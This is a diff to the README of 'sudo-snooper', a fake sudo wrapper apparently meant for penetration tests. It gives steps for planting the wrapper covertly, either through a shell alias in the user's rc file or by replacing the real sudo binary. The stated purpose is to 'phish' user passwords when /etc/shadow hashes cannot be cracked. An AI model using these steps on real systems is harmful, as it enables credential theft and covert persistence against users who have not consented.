@@ -8,9 +8,25 @@ This can be useful in penetration tests or security evaluations for testing user
 
 ## Installation steps
 
-### Option 1 - Install in place of the real sudo (harder but less obvious)
+### Option 1 - Alias the sudo command (easier but somewhat more noticable)
+
+This option is easier to do and more portable, however it might be more noticable to careful users.
+
+Edit the .rc file of the shell the user is using (can be .bashrc .zshrc and so on) and add the following:
+
+```
+alias sudo='python3 /path/to/sudo-snooper.py'
+```
+
+Make sure sudo-snooper.py has the correct permissions.
+
+### Option 2 - Install in place of the real sudo (harder but less obvious)
 
 **You need root access for this install option**
+
+This only becomes useful if you already have root access but can't crack the
+hashes from `/etc/shadow` for some reason. Basically you can phish the users
+password out of them.
 
 * move the original sudo binary to another name
 
@@ -41,17 +57,7 @@ sudo = 'sudo'
 
 To do that under Archlinux: `pyinstaller --onefile sudo-snooper.py` will work. However please note that once compiled you won't be able to change the parameters in the compiled binary.
 
-### Option 2 - Alias the sudo command (easier but somewhat more noticable)
 
-This option is easier to do and more portable, however it might be more noticable to careful users.
-
-Edit the .rc file of the shell the user is using (can be .bashrc .zshrc and so on) and add the following:
-
-```
-alias sudo='python3 /path/to/sudo-snooper.py'
-```
-
-Make sure sudo-snooper.py has the correct permissions.
 
 
 ## Usage:
